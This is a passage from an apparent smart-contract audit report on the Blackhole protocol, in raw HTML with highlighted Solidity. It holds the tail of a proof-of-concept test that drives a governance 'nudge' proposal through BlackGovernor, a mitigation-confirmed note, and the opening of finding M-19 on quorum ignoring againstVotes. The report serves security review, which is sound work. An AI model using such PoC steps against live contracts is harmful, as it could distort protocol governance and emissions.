class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e\u0026lt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e67\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdate_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e             \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreate_lock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e365\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edays\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochTimehash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochNext\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nudge proposal\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evotingDelay\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Against Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;For Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Abstain Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evotingPeriod\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochTimehash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//Look at the logs and status of the Governor\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-42\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-10\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-33\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease\" style=\"position:relative;\"\u003e\u003ca href=\"#m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease\" aria-label=\"m 19 quorum does not include the againstvotes leading to emissions rate staying the same even if it should decrease permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-306\"\u003e[M-19] Quorum does not include the \u003ccode\u003eagainstVotes\u003c/code\u003e leading to emissions rate staying the same even if it should decrease\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-419\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L184-L191\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L184-L191\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L680-L684\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L680-L684\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L138-L155\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L138-L155\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-7\" aria-label=\"finding description and impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eBlackGovernor\u003c/code\u003e should be able to, based on user votes determine the status of the proposal and then execute it. We can see from the code that if proposal succeeds, then the emissions inside the \u003ccode\u003eMinterUpgradeable\u003c/code\u003e should decrease by 1%, if proposal is defeated it should decrease by 1%, otherwise, if quorum is not reached or the \u003ccode\u003eforVotes\u003c/code\u003e/\u003ccode\u003eagainstVotes\u003c/code\u003e are not big enough compared to abstain votes (which means proposal state is expired) the emissions should stay the same.\u003c/p\u003e\n\u003cp\u003eHowever, when determining the status of the proposal the following check is made:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// quorum reached is basically a percentage check which is of the number specified in constructor of the L2GovernorVotesQuorumFraction(4) // 4%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_voteSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan 